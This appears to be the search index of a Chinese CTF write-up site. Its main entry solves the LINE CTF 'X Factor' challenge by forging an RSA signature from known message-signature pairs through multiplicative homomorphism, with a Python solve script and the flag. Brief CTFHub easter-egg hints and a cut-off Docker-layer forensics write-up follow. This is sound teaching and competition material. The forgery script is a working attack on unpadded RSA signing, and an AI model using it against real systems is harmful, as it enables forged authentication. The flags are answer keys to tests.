\u6839\u636e\u5df2\u77e5\u660e\u5bc6\u6587\u5bf9\u83b7\u53d6\u6307\u5b9a\u6d88\u606f 0x686178656c696f6e \u7684\u7b7e\u540d\uff0c\u53ea\u8981\u6307\u5b9a\u6d88\u606f\u7684\u56e0\u6570\u5305\u542b\u4e8e\u6240\u6709\u7ed9\u5b9a\u6d88\u606f\u7684\u56e0\u6570\uff0c\u5219\u53ef\u7531 RSA \u7684\u4e58\u6cd5\u540c\u6001\u6027\u63a8\u51fa \\(E(ab) = E(a) \\cdot E(b)(mod\\, n)\\) \\(E(a/b) = E(a) \\cdot E(b)^{-1}(mod\\, n)\\) \u83b7\u53d6\u6240\u6709\u660e\u6587\u7684\u56e0\u6570\uff0c\u53ef\u89c1\uff0c\u6307\u5b9a\u6d88\u606f\u6240\u6709\u56e0\u6570\u5b8c\u5168\u5305\u542b\u4e8e\u7ed9\u5b9a\u6d88\u606f\u7684\u56e0\u6570 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 from factordb.factordb import FactorDB pt = [ 0x686178656c696f6e , 0x945d86b04b2e7c7 , 0x5de2 , 0xa16b201cdd42ad70da249 , 0x6d993121ed46b , 0x726fa7a7 , 0x31e828d97a0874cff , 0x904a515 ] for i in pt : f = FactorDB ( i ) f . connect () print ( chr ( pt . index ( i ) + ord ( 'a' )), hex ( i ), f . get_factor_list ()) # a 0x686178656c696f6e [2, 197, 947, 2098711, 9605087] # b 0x945d86b04b2e7c7 [811, 947, 947, 947, 970111] # c 0x5de2 [2, 61, 197] # d 0xa16b201cdd42ad70da249 [970111, 2098711, 2098711, 2854343] # e 0x6d993121ed46b [947, 970111, 2098711] # f 0x726fa7a7 [61, 197, 197, 811] # g 0x31e828d97a0874cff [2098711, 2854343, 9605087] # h 0x904a515 [197, 811, 947] \u7ecf\u8fc7\u624b\u5de5\u8ba1\u7b97\uff0c\u6307\u5b9a\u6d88\u606f \\(a=\\frac{c\\times e^2\\times g\\times h^2}{b\\times d\\times f}\\) \uff0c\u90a3\u4e48\u63a5\u4e0b\u6765\u5229\u7528 RSA \u7684\u4e58\u6cd5\u540c\u6001\u6027\u6c42\u89e3\u5c31\u597d\u5566 > < 1 2 3 4 5 6 7 8 from Crypto.Util.number import inverse n = 0xa9e7da28ebecf1f88efe012b8502122d70b167bdcfa11fd24429c23f27f55ee2cc3dcd7f337d0e630985152e114830423bfaf83f4f15d2d05826bf511c343c1b13bef744ff2232fb91416484be4e130a007a9b432225c5ead5a1faf02fa1b1b53d1adc6e62236c798f76695bb59f737d2701fe42f1fbf57385c29de12e79c5b3 ct = [ 0x17bb21949d5a0f590c6126e26dc830b51d52b8d0eb4f2b69494a9f9a637edb1061bec153f0c1d9dd55b1ad0fd4d58c46e2df51d293cdaaf1f74d5eb2f230568304eebb327e30879163790f3f860ca2da53ee0c60c5e1b2c3964dbcf194c27697a830a88d53b6e0ae29c616e4f9826ec91f7d390fb42409593e1815dbe48f7ed4 , 0x3ea73715787028b52796061fb887a7d36fb1ba1f9734e9fd6cb6188e087da5bfc26c4bfe1b4f0cbfa0d693d4ac0494efa58888e8415964c124f7ef293a8ee2bc403cad6e9a201cdd442c102b30009a3b63fa61cdd7b31ce9da03507901b49a654e4bb2b03979aea0fab3731d4e564c3c30c75aa1d079594723b60248d9bdde50 , 0x9444e3fc71056d25489e5ce78c6c986c029f12b61f4f4b5cbd4a0ce6b999919d12c8872b8f2a8a7e91bd0f263a4ead8f2aa4f7e9fdb9096c2ea11f693f6aa73d6b9d5e351617d6f95849f9c73edabd6a6fde6cc2e4559e67b0e4a2ea8d6897b32675be6fc72a6172fd42a8a8e96adfc2b899015b73ff80d09c35909be0a6e13a , 0x2b7a1c4a1a9e9f9179ab7b05dd9e0089695f895864b52c73bfbc37af3008e5c187518b56b9e819cc2f9dfdffdfb86b7cc44222b66d3ea49db72c72eb50377c8e6eb6f6cbf62efab760e4a697cbfdcdc47d1adc183cc790d2e86490da0705717e5908ad1af85c58c9429e15ea7c83ccf7d86048571d50bd721e5b3a0912bed7c , 0xa7d5548d5e4339176a54ae1b3832d328e7c512be5252dabd05afa28cd92c7932b7d1c582dc26a0ce4f06b1e96814ee362ed475ddaf30dd37af0022441b36f08ec8c7c4135d6174167a43fa34f587abf806a4820e4f74708624518044f272e3e1215404e65b0219d42a706e5c295b9bf0ee8b7b7f9b6a75d76be64cf7c27dfaeb , 0x67832c41a913bcc79631780088784e46402a0a0820826e648d84f9cc14ac99f7d8c10cf48a6774388daabcc0546d4e1e8e345ee7fc60b249d95d953ad4d923ca3ac96492ba71c9085d40753cab256948d61aeee96e0fe6c9a0134b807734a32f26430b325df7b6c9f8ba445e7152c2bf86b4dfd4293a53a8d6f003bf8cf5dffd , 0x927a6ecd74bb7c7829741d290bc4a1fd844fa384ae3503b487ed51dbf9f79308bb11238f2ac389f8290e5bcebb0a4b9e09eda084f27add7b1995eeda57eb043deee72bfef97c3f90171b7b91785c2629ac9c31cbdcb25d081b8a1abc4d98c4a1fd9f074b583b5298b2b6cc38ca0832c2174c96f2c629afe74949d97918cbee4a ] S = inverse ( ct [ 0 ], n ) * ct [ 1 ] * inverse ( ct [ 2 ], n ) * pow ( ct [ 3 ], 2 , n ) * inverse ( ct [ 4 ], n ) * ct [ 5 ] * pow ( ct [ 6 ], 2 , n ) % n print ( hex ( S )[ - 32 :]) # a049347a7db8226d496eb55c15b1d840 Flag \u00b6 LINECTF{a049347a7db8226d496eb55c15b1d840} \u53c2\u8003\u8d44\u6599 \u00b6 Homomorphic Encryption For Division With RSA | by Prof Bill Buchanan OBE | Medium","title":"X Factor"},{"location":"crypto/x_factor/#_1","text":"Decrypt it! x_factor.md 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 I have generated a RSA-1024 key pair: * public key exponent: 0x10001 * public key modulus: 0xa9e7da28ebecf1f88efe012b8502122d70b167bdcfa11fd24429c23f27f55ee2cc3dcd7f337d0e630985152e114830423bfaf83f4f15d2d05826bf511c343c1b13bef744ff2232fb91416484be4e130a007a9b432225c5ead5a1faf02fa1b1b53d1adc6e62236c798f76695bb59f737d2701fe42f1fbf57385c29de12e79c5b3 Here are some known plain -> signature pairs I generated using my private key: * 0x945d86b04b2e7c7 -> 0x17bb21949d5a0f590c6126e26dc830b51d52b8d0eb4f2b69494a9f9a637edb1061bec153f0c1d9dd55b1ad0fd4d58c46e2df51d293cdaaf1f74d5eb2f230568304eebb327e30879163790f3f860ca2da53ee0c60c5e1b2c3964dbcf194c27697a830a88d53b6e0ae29c616e4f9826ec91f7d390fb42409593e1815dbe48f7ed4 * 0x5de2 -> 0x3ea73715787028b52796061fb887a7d36fb1ba1f9734e9fd6cb6188e087da5bfc26c4bfe1b4f0cbfa0d693d4ac0494efa58888e8415964c124f7ef293a8ee2bc403cad6e9a201cdd442c102b30009a3b63fa61cdd7b31ce9da03507901b49a654e4bb2b03979aea0fab3731d4e564c3c30c75aa1d079594723b60248d9bdde50 * 0xa16b201cdd42ad70da249 -> 0x9444e3fc71056d25489e5ce78c6c986c029f12b61f4f4b5cbd4a0ce6b999919d12c8872b8f2a8a7e91bd0f263a4ead8f2aa4f7e9fdb9096c2ea11f693f6aa73d6b9d5e351617d6f95849f9c73edabd6a6fde6cc2e4559e67b0e4a2ea8d6897b32675be6fc72a6172fd42a8a8e96adfc2b899015b73ff80d09c35909be0a6e13a * 0x6d993121ed46b -> 0x2b7a1c4a1a9e9f9179ab7b05dd9e0089695f895864b52c73bfbc37af3008e5c187518b56b9e819cc2f9dfdffdfb86b7cc44222b66d3ea49db72c72eb50377c8e6eb6f6cbf62efab760e4a697cbfdcdc47d1adc183cc790d2e86490da0705717e5908ad1af85c58c9429e15ea7c83ccf7d86048571d50bd721e5b3a0912bed7c * 0x726fa7a7 -> 0xa7d5548d5e4339176a54ae1b3832d328e7c512be5252dabd05afa28cd92c7932b7d1c582dc26a0ce4f06b1e96814ee362ed475ddaf30dd37af0022441b36f08ec8c7c4135d6174167a43fa34f587abf806a4820e4f74708624518044f272e3e1215404e65b0219d42a706e5c295b9bf0ee8b7b7f9b6a75d76be64cf7c27dfaeb * 0x31e828d97a0874cff -> 0x67832c41a913bcc79631780088784e46402a0a0820826e648d84f9cc14ac99f7d8c10cf48a6774388daabcc0546d4e1e8e345ee7fc60b249d95d953ad4d923ca3ac96492ba71c9085d40753cab256948d61aeee96e0fe6c9a0134b807734a32f26430b325df7b6c9f8ba445e7152c2bf86b4dfd4293a53a8d6f003bf8cf5dffd * 0x904a515 -> 0x927a6ecd74bb7c7829741d290bc4a1fd844fa384ae3503b487ed51dbf9f79308bb11238f2ac389f8290e5bcebb0a4b9e09eda084f27add7b1995eeda57eb043deee72bfef97c3f90171b7b91785c2629ac9c31cbdcb25d081b8a1abc4d98c4a1fd9f074b583b5298b2b6cc38ca0832c2174c96f2c629afe74949d97918cbee4a **What is the signature of 0x686178656c696f6e?** Take the least significant 16 bytes of the signature, encode them in lowercase hexadecimal and format it as `LINECTF{sig_lowest_16_bytes_hex}` to obtain the flag. E.g. the last signature from the list above would become `LINECTF{174c96f2c629afe74949d97918cbee4a}` .","title":"\u9898\u76ee"},{"location":"crypto/x_factor/#_2","text":"\u6839\u636e\u5df2\u77e5\u660e\u5bc6\u6587\u5bf9\u83b7\u53d6\u6307\u5b9a\u6d88\u606f 0x686178656c696f6e \u7684\u7b7e\u540d\uff0c\u53ea\u8981\u6307\u5b9a\u6d88\u606f\u7684\u56e0\u6570\u5305\u542b\u4e8e\u6240\u6709\u7ed9\u5b9a\u6d88\u606f\u7684\u56e0\u6570\uff0c\u5219\u53ef\u7531 RSA \u7684\u4e58\u6cd5\u540c\u6001\u6027\u63a8\u51fa \\(E(ab) = E(a) \\cdot E(b)(mod\\, n)\\) \\(E(a/b) = E(a) \\cdot E(b)^{-1}(mod\\, n)\\) \u83b7\u53d6\u6240\u6709\u660e\u6587\u7684\u56e0\u6570\uff0c\u53ef\u89c1\uff0c\u6307\u5b9a\u6d88\u606f\u6240\u6709\u56e0\u6570\u5b8c\u5168\u5305\u542b\u4e8e\u7ed9\u5b9a\u6d88\u606f\u7684\u56e0\u6570 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 from factordb.factordb import FactorDB pt = [ 0x686178656c696f6e , 0x945d86b04b2e7c7 , 0x5de2 , 0xa16b201cdd42ad70da249 , 0x6d993121ed46b , 0x726fa7a7 , 0x31e828d97a0874cff , 0x904a515 ] for i in pt : f = FactorDB ( i ) f . connect () print ( chr ( pt . index ( i ) + ord ( 'a' )), hex ( i ), f . get_factor_list ()) # a 0x686178656c696f6e [2, 197, 947, 2098711, 9605087] # b 0x945d86b04b2e7c7 [811, 947, 947, 947, 970111] # c 0x5de2 [2, 61, 197] # d 0xa16b201cdd42ad70da249 [970111, 2098711, 2098711, 2854343] # e 0x6d993121ed46b [947, 970111, 2098711] # f 0x726fa7a7 [61, 197, 197, 811] # g 0x31e828d97a0874cff [2098711, 2854343, 9605087] # h 0x904a515 [197, 811, 947] \u7ecf\u8fc7\u624b\u5de5\u8ba1\u7b97\uff0c\u6307\u5b9a\u6d88\u606f \\(a=\\frac{c\\times e^2\\times g\\times h^2}{b\\times d\\times f}\\) \uff0c\u90a3\u4e48\u63a5\u4e0b\u6765\u5229\u7528 RSA \u7684\u4e58\u6cd5\u540c\u6001\u6027\u6c42\u89e3\u5c31\u597d\u5566 > < 1 2 3 4 5 6 7 8 from Crypto.Util.number import inverse n = 0xa9e7da28ebecf1f88efe012b8502122d70b167bdcfa11fd24429c23f27f55ee2cc3dcd7f337d0e630985152e114830423bfaf83f4f15d2d05826bf511c343c1b13bef744ff2232fb91416484be4e130a007a9b432225c5ead5a1faf02fa1b1b53d1adc6e62236c798f76695bb59f737d2701fe42f1fbf57385c29de12e79c5b3 ct = [ 0x17bb21949d5a0f590c6126e26dc830b51d52b8d0eb4f2b69494a9f9a637edb1061bec153f0c1d9dd55b1ad0fd4d58c46e2df51d293cdaaf1f74d5eb2f230568304eebb327e30879163790f3f860ca2da53ee0c60c5e1b2c3964dbcf194c27697a830a88d53b6e0ae29c616e4f9826ec91f7d390fb42409593e1815dbe48f7ed4 , 0x3ea73715787028b52796061fb887a7d36fb1ba1f9734e9fd6cb6188e087da5bfc26c4bfe1b4f0cbfa0d693d4ac0494efa58888e8415964c124f7ef293a8ee2bc403cad6e9a201cdd442c102b30009a3b63fa61cdd7b31ce9da03507901b49a654e4bb2b03979aea0fab3731d4e564c3c30c75aa1d079594723b60248d9bdde50 , 0x9444e3fc71056d25489e5ce78c6c986c029f12b61f4f4b5cbd4a0ce6b999919d12c8872b8f2a8a7e91bd0f263a4ead8f2aa4f7e9fdb9096c2ea11f693f6aa73d6b9d5e351617d6f95849f9c73edabd6a6fde6cc2e4559e67b0e4a2ea8d6897b32675be6fc72a6172fd42a8a8e96adfc2b899015b73ff80d09c35909be0a6e13a , 0x2b7a1c4a1a9e9f9179ab7b05dd9e0089695f895864b52c73bfbc37af3008e5c187518b56b9e819cc2f9dfdffdfb86b7cc44222b66d3ea49db72c72eb50377c8e6eb6f6cbf62efab760e4a697cbfdcdc47d1adc183cc790d2e86490da0705717e5908ad1af85c58c9429e15ea7c83ccf7d86048571d50bd721e5b3a0912bed7c , 0xa7d5548d5e4339176a54ae1b3832d328e7c512be5252dabd05afa28cd92c7932b7d1c582dc26a0ce4f06b1e96814ee362ed475ddaf30dd37af0022441b36f08ec8c7c4135d6174167a43fa34f587abf806a4820e4f74708624518044f272e3e1215404e65b0219d42a706e5c295b9bf0ee8b7b7f9b6a75d76be64cf7c27dfaeb , 0x67832c41a913bcc79631780088784e46402a0a0820826e648d84f9cc14ac99f7d8c10cf48a6774388daabcc0546d4e1e8e345ee7fc60b249d95d953ad4d923ca3ac96492ba71c9085d40753cab256948d61aeee96e0fe6c9a0134b807734a32f26430b325df7b6c9f8ba445e7152c2bf86b4dfd4293a53a8d6f003bf8cf5dffd , 0x927a6ecd74bb7c7829741d290bc4a1fd844fa384ae3503b487ed51dbf9f79308bb11238f2ac389f8290e5bcebb0a4b9e09eda084f27add7b1995eeda57eb043deee72bfef97c3f90171b7b91785c2629ac9c31cbdcb25d081b8a1abc4d98c4a1fd9f074b583b5298b2b6cc38ca0832c2174c96f2c629afe74949d97918cbee4a ] S = inverse ( ct [ 0 ], n ) * ct [ 1 ] * inverse ( ct [ 2 ], n ) * pow ( ct [ 3 ], 2 , n ) * inverse ( ct [ 4 ], n ) * ct [ 5 ] * pow ( ct [ 6 ], 2 , n ) % n print ( hex ( S )[ - 32 :]) # a049347a7db8226d496eb55c15b1d840","title":"\u89e3\u9898\u601d\u8def"},{"location":"crypto/x_factor/#flag","text":"LINECTF{a049347a7db8226d496eb55c15b1d840}","title":"Flag"},{"location":"crypto/x_factor/#_3","text":"Homomorphic Encryption For Division With RSA | by Prof Bill Buchanan OBE | Medium","title":"\u53c2\u8003\u8d44\u6599"},{"location":"eggs/ctfhub_exams/","text":"\u9898\u76ee \u00b6 \u6700\u540e\u3002\u6765\u627e\u627e\u9690\u85cf\u5728\u771f\u9898\u4e2d\u7684\u5f69\u86cb \u89e3\u9898\u601d\u8def \u00b6 \u5386\u5e74\u771f\u9898\u6807\u7b7e\uff0c\u7ffb\u5230\u6700\u540e\u4e00\u9875\uff0c\u53d1\u73b0 flag","title":"CTFHub - \u771f\u9898"},{"location":"eggs/ctfhub_exams/#_1","text":"\u6700\u540e\u3002\u6765\u627e\u627e\u9690\u85cf\u5728\u771f\u9898\u4e2d\u7684\u5f69\u86cb","title":"\u9898\u76ee"},{"location":"eggs/ctfhub_exams/#_2","text":"\u5386\u5e74\u771f\u9898\u6807\u7b7e\uff0c\u7ffb\u5230\u6700\u540e\u4e00\u9875\uff0c\u53d1\u73b0 flag","title":"\u89e3\u9898\u601d\u8def"},{"location":"eggs/ctfhub_index/","text":"\u9898\u76ee \u00b6 \u542c\u8bf4\u5728\u9996\u9875\u7684\u67d0\u4e2a\u5730\u65b9\u9690\u85cf\u4e86\u4e00\u4e2a flag\uff0c\u53ef\u80fd\u5728 *.ctfhub.com \u4e2d\uff0c\u4e0d\u59a8\u5148\u627e\u5230 flag \u518d\u6765\u5f00\u9898 \u89e3\u9898\u601d\u8def \u00b6 \u76f4\u63a5\u770b\u9996\u9875\u5e76\u6ca1\u6709\u4ec0\u4e48\u7279\u522b\u7684\u53d1\u73b0(\u256e\u014f\u03c9\u014f)\u256d \u9898\u76ee\u63d0\u793a flag \u53ef\u80fd\u5728 *.ctfhub.com \u4e2d\uff0c\u8bf4\u660e\u4e0d\u4e00\u5b9a\u662f www.ctfhub.com \u89c2\u5bdf\u8bbf\u95ee\u9996\u9875\u65f6\u7684\u7f51\u7edc\u901a\u4fe1\uff0c\u5171\u53d1\u73b0\u4e09\u4e2a\u57df\u540d\uff1a www.ctfhub.com \u3001api.ctfhub.com\u3001static.ctfhub.com \u8bbf\u95ee api.ctfhub.com \u5c31\u53ef\u4ee5\u53d1\u73b0 flag \u4e86 static.ctfhub.com \u5e76\u4e0d\u80fd\u8bbf\u95ee XD","title":"CTFHub - \u9996\u9875"},{"location":"eggs/ctfhub_index/#_1","text":"\u542c\u8bf4\u5728\u9996\u9875\u7684\u67d0\u4e2a\u5730\u65b9\u9690\u85cf\u4e86\u4e00\u4e2a flag\uff0c\u53ef\u80fd\u5728 *.ctfhub.com \u4e2d\uff0c\u4e0d\u59a8\u5148\u627e\u5230 flag \u518d\u6765\u5f00\u9898","title":"\u9898\u76ee"},{"location":"eggs/ctfhub_index/#_2","text":"\u76f4\u63a5\u770b\u9996\u9875\u5e76\u6ca1\u6709\u4ec0\u4e48\u7279\u522b\u7684\u53d1\u73b0(\u256e\u014f\u03c9\u014f)\u256d \u9898\u76ee\u63d0\u793a flag \u53ef\u80fd\u5728 *.ctfhub.com \u4e2d\uff0c\u8bf4\u660e\u4e0d\u4e00\u5b9a\u662f www.ctfhub.com \u89c2\u5bdf\u8bbf\u95ee\u9996\u9875\u65f6\u7684\u7f51\u7edc\u901a\u4fe1\uff0c\u5171\u53d1\u73b0\u4e09\u4e2a\u57df\u540d\uff1a www.ctfhub.com \u3001api.ctfhub.com\u3001static.ctfhub.com \u8bbf\u95ee api.ctfhub.com \u5c31\u53ef\u4ee5\u53d1\u73b0 flag \u4e86 static.ctfhub.com \u5e76\u4e0d\u80fd\u8bbf\u95ee XD","title":"\u89e3\u9898\u601d\u8def"},{"location":"eggs/ctfhub_match/","text":"\u9898\u76ee \u00b6 \u8d5b\u4e8b\u4e2d\u8c8c\u4f3c\u4e5f\u6709\u54ce \u89e3\u9898\u601d\u8def \u00b6 \u8d5b\u4e8b\u4e2d\u5fc3\u6807\u7b7e\uff0c\u67e5\u8be2\u540d\u79f0\u4e3a egg \u7684\u8d5b\u4e8b","title":"CTFHub - \u8d5b\u4e8b"},{"location":"eggs/ctfhub_match/#_1","text":"\u8d5b\u4e8b\u4e2d\u8c8c\u4f3c\u4e5f\u6709\u54ce","title":"\u9898\u76ee"},{"location":"eggs/ctfhub_match/#_2","text":"\u8d5b\u4e8b\u4e2d\u5fc3\u6807\u7b7e\uff0c\u67e5\u8be2\u540d\u79f0\u4e3a egg \u7684\u8d5b\u4e8b","title":"\u89e3\u9898\u601d\u8def"},{"location":"eggs/ctfhub_tools/","text":"\u9898\u76ee \u00b6 \u5de5\u5177\u4e2d\u4e5f\u9690\u85cf\u4e86\u4e00\u4e2a\uff0c\u4e0d\u59a8\u7ffb\u4e00\u7ffb\uff1f \u89e3\u9898\u601d\u8def \u00b6 \u5de5\u5177\u6807\u7b7e\uff0c\u7ffb\u5230\u6700\u540e\u4e00\u9875\uff0c\u53d1\u73b0\u5f69\u86cb\uff0c\u94fe\u63a5\u5373\u5305\u542b flag","title":"CTFHub - \u5de5\u5177"},{"location":"eggs/ctfhub_tools/#_1","text":"\u5de5\u5177\u4e2d\u4e5f\u9690\u85cf\u4e86\u4e00\u4e2a\uff0c\u4e0d\u59a8\u7ffb\u4e00\u7ffb\uff1f","title":"\u9898\u76ee"},{"location":"eggs/ctfhub_tools/#_2","text":"\u5de5\u5177\u6807\u7b7e\uff0c\u7ffb\u5230\u6700\u540e\u4e00\u9875\uff0c\u53d1\u73b0\u5f69\u86cb\uff0c\u94fe\u63a5\u5373\u5305\u542b flag","title":"\u89e3\u9898\u601d\u8def"},{"location":"eggs/ctfhub_wechat/","text":"\u9898\u76ee \u00b6 \u5728 CTFHub \u5fae\u4fe1\u516c\u4f17\u53f7\u4e0a\u7b7e\u5230\u53ef\u83b7\u5f97\u66f4\u591a\u91d1\u5e01\u3002\u542c\u8bf4\u5728\u5fae\u4fe1\u516c\u4f17\u53f7\u4e0a\u4e5f\u6709\u4e2a\u5f69\u86cb\uff0c\u53bb\u770b\u770b\u5427 \u89e3\u9898\u601d\u8def \u00b6","title":"CTFHub - \u516c\u4f17\u53f7"},{"location":"eggs/ctfhub_wechat/#_1","text":"\u5728 CTFHub \u5fae\u4fe1\u516c\u4f17\u53f7\u4e0a\u7b7e\u5230\u53ef\u83b7\u5f97\u66f4\u591a\u91d1\u5e01\u3002\u542c\u8bf4\u5728\u5fae\u4fe1\u516c\u4f17\u53f7\u4e0a\u4e5f\u6709\u4e2a\u5f69\u86cb\uff0c\u53bb\u770b\u770b\u5427","title":"\u9898\u76ee"},{"location":"eggs/ctfhub_wechat/#_2","text":"","title":"\u89e3\u9898\u601d\u8def"},{"location":"misc/233_docker/","text":"\u9898\u76ee \u00b6 233 \u540c\u5b66\u5728\u8f6f\u5de5\u8bfe\u4e0a\u5b66\u5230\u4e86 Docker \u8fd9\u79cd\u65b9\u4fbf\u7684\u4e1c\u897f\uff0c\u4e8e\u662f\u7ed9\u81ea\u5df1\u7684\u5b57\u7b26\u4e32\u5de5\u5177\u9879\u76ee\u5199\u4e86\u4e00\u4e2a Dockerfile\u3002 \u4f46\u662f 233 \u540c\u5b66\u7a81\u7136\u53d1\u73b0\u5b83\u4e0d\u5c0f\u5fc3\u628a\u4e00\u4e2a\u79c1\u5bc6\u6587\u4ef6\uff08flag.txt\uff09\u6253\u5305\u8fdb\u53bb\u4e86\uff0c\u4e8e\u662f\u5199\u4e86\u4e00\u884c\u547d\u4ee4\u5220\u6389\u8fd9\u4e2a\u6587\u4ef6\u3002 \u300c\u65e2\u7136\u5df2\u7ecf\u5220\u6389\u4e86\uff0c\u5e94\u8be5\u4e0d\u4f1a\u88ab\u4eba\u627e\u51fa\u6765\u5427\uff1f\u300d233 \u60f3\u9053\u3002 Docker Hub \u5730\u5740\uff1a 8b8d3c8324c7/stringtool \u57fa\u7840\u77e5\u8bc6 \u00b6 Docker \u955c\u50cf\u7531\u4e00\u7cfb\u5217\u5c42\u7ec4\u6210\uff0c\u9664\u6700\u540e\u4e00\u5c42\uff0c\u5176\u4ed6\u90fd\u662f\u53ea\u8bfb\u5c42\uff0c\u6bcf\u4e00\u5c42\u4ee3\u8868\u4e00\u53e5 Dockerfile \u6307\u4ee4\uff0c\u8fd9\u4e9b\u5c42\u88ab\u5806\u53e0\u8d77\u6765\uff0c\u6bcf\u4e00\u5c42\u90fd\u662f\u4e0a\u4e00\u5c42\u53d8\u5316\u7684\u589e\u91cf \u53ea\u6709 RUN \u3001 COPY \u3001 ADD \u6307\u4ee4\u521b\u5efa\u65b0\u7684\u5c42\uff0c\u5176\u5b83\u6307\u4ee4\u53ea\u521b\u5efa\u4e34\u65f6\u4e2d\u95f4\u955c\u50cf\uff0c\u4e0d\u589e\u52a0\u6784\u5efa\u7684\u5927\u5c0f \u6bcf\u4e2a\u955c\u50cf\u5c42\u5728 /var/lib/docker/<storage-driver> \u4e0b\u90fd\u6709\u81ea\u5df1\u7684\u76ee\u5f55\uff0c\u5305\u542b\u955c\u50cf\u7684\u5185\u5bb9 \u89e3\u9898\u601d\u8def \u00b6 \u9898\u76ee\u4e2d\u63d0\u5230 \u4e8e\u662f\u5199\u4e86\u4e00\u884c\u547d\u4ee4\u5220\u6389\u8fd9\u4e2a\u6587\u4ef6 \uff0c\u4f7f\u7528\u7684\u5e94\u8be5\u662f\u5f62\u5982 RUN rm flag.txt \u7684\u547d\u4ee4\uff0c RUN \u6307\u4ee4\u4f1a\u521b\u5efa\u65b0\u7684\u5c42\uff0c\u800c\u975e\u4f7f\u7528\u4e34\u65f6\u4e2d\u95f4\u955c\u50cf\uff0c\u90a3\u4e48\u627e\u5230\u8fd9\u4e00\u5c42\uff0c\u5c31\u53ef\u4ee5\u627e\u5230 flag.txt \u83b7\u53d6\u5404\u5c42\u7684\u76ee\u5f55\u4fe1\u606f\uff0c\u955c\u50cf\u5c42\u4e3a lowerdir \uff0c diff \u76ee\u5f55\u4e0b\u5305\u542b\u8be5\u5c42\u7684\u5185\u5bb9 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 $ docker inspect 8b8d3c8324c7/stringtool [ { \"Id\" : \"sha256:be6d023618d199e0ec7448f70e5e47a00c6c2b79777ad5e2d312a6f74d6ad56b\" , \"RepoTags\" : [ \"8b8d3c8324c7/stringtool:latest\" ] , \"RepoDigests\" : [ \"8b8d3c8324c7/stringtool@sha256:aef87a00ad7a4e240e4b475ea265d3818c694034c26ec227d8d4f445f3d93152\" ] , \"Parent\" : \"\" , \"Comment\" : \"\" , \"Created\" : \"2020-10-16T12:51:09.221320098Z\" , \"Container\" : \"d2f452fddd5c71c8c57a29d67f29c69ffac419440d57664dad6e4ba1f0eff8a1\" , \"ContainerConfig\" : { ... } , \"DockerVersion\" : \"19.03.5\" , \"Author\" : \"Software_Engineering_Project\" , \"Config\" : { ... } , \"Architecture\" : \"amd64\" , \"Os\" : \"linux\" , \"Size\" : 1430524643 , \"VirtualSize\" : 1430524643 , \"GraphDriver\" : { \"Data\" : { \"LowerDir\" : \"/var/lib/docker/overlay2/6edccc4d6d8f057b4b42b8f448b9bbbd4809be182e9fa263ac4a486a08f0bedd/diff: /var/lib/docker/overlay2/72c760a6faaf0c00299a0416d4a7d7892dbbe84c0d723e3cd026cf9bc23f2225/diff: /var/lib/docker/overlay2/9c29b0ec3156e99f41991b01534021a575347898c6836c8077f5516ffee138af/diff: /var/lib/docker/overlay2/a8721c9f92017818f0bfb114966aa0b84b543cfbefe359cfb5fd733df7e25431/diff: /var/lib/docker/overlay2/ebfbfcd1df60c25be45dd84de29f38b15f39825ce5f231492a85cd857f08af31/diff: /var/lib/docker/overlay2/bf646619d7607fb28d5deec60b2e340a612add9825590f34a23e8205c5d209f6/diff: /var/lib/docker/overlay2/31943f86d1bbe26181f3bef8f3ae1de40f2650458ad373a8a2a71f5234d61890/diff: /var/lib/docker/overlay2/29d9434b310f8c5a17746f7c8a5d56e84c631696794e752fb2e19ab2112d1534/diff: /var/lib/docker/overlay2/ea91dc145974b3159822f833367282a6cff5bc4fed614146b07e931795679298/diff: /var/lib/docker/overlay2/f3eb4d3cf03440fded8f1bf09c8e797472471fcacbe25217b7ce7f9ffab3f309/diff: /var/lib/docker/overlay2/d47b622e362e0bbbd442de5608ef290f62e7a828c3c49ef4897c2bd6bc53cddf/diff: /var/lib/docker/overlay2/edef4c3786d7fd34d6edc434c22b8d0650f640a2c1c06a0171e424302cc4b756/diff: /var/lib/docker/overlay2/a9812c2890727e60f709b917d69845dd39c8bddff28651e617b35dbba0684efe/diff: /var/lib/docker/overlay2/56ae36174f5ac0f1219fb9d05125d76cc418050d191de2c11710ec4045c38717/diff: /var/lib/docker/overlay2/af2fc9999b37a6e0ac6aad23e8a7d3ecda2696afa36a5cf31056e37f8e416ad4/diff: /var/lib/docker/overlay2/6711b59d1f347f930e92df00f5a684eca8eedce1ced9df984ccbd2232e45bb30/diff: /var/lib/docker/overlay2/24373e7f69c254b21c3b16128e6055ba09a58acb8bc08cc9273c0d745dc1cc0c/diff: /var/lib/docker/overlay2/8261fbe516dac64a01f9e5d213bcd42dca12e8cfb1f95a530497511a21b328f3/diff: /var/lib/docker/overlay2/ce4ad073872a2365e6f364031d121b0aa174fefa565a7c7904300f638d9cf3a9/diff: /var/lib/docker/overlay2/4db84c7954a7906e803b5e2bae2d0e8c3dcb7ad39f3d27822bd6bee6d42954a1/diff: /var/lib/docker/overlay2/e99c01108bb370642151fbdc8209bc70c8871604a5efd2a6b9005c29160b03fe/diff: /var/lib/docker/overlay2/bbe523d8bff045d3c6db194ded9773912a2a527564724c9c27393cdb47d94754/diff\" , \"MergedDir\" : \"/var/lib/docker/overlay2/66b4f69b33d469a3d81a2fa03e1e621b8de2b9ed4ba8a756279c2d3a0a39fa7e/merged\" , \"UpperDir\" : \"/var/lib/docker/overlay2/66b4f69b33d469a3d81a2fa03e1e621b8de2b9ed4ba8a756279c2d3a0a39fa7e/diff\" , \"WorkDir\" : \"/var/lib/docker/overlay2/66b4f69b33d469a3d81a2fa03e1e621b8de2b9ed4ba8a756279c2d3a0a39fa7e/work\" } , \"Name\" : \"overlay2\" } , \"RootFS\" : { \"Type\" : \"layers\" , \"Layers\" : [ \"sha256:613be09ab3c0860a5216936f412f09927947012f86bfa89b263dfa087a725f81\" , ... \"sha256:ce2f773d43eee87d53a828fbcd2daa8e6ae3f0490fbaf616a8aba752839072ff\" ] } , \"Metadata\" : { \"LastTagTime\" : \"0001-01-01T00:00:00Z\" } } ] \u901a\u8fc7 history \u67e5\u770b\u5404\u5c42\u7684\u6307\u4ee4\uff0c\u5220\u9664 flag.txt 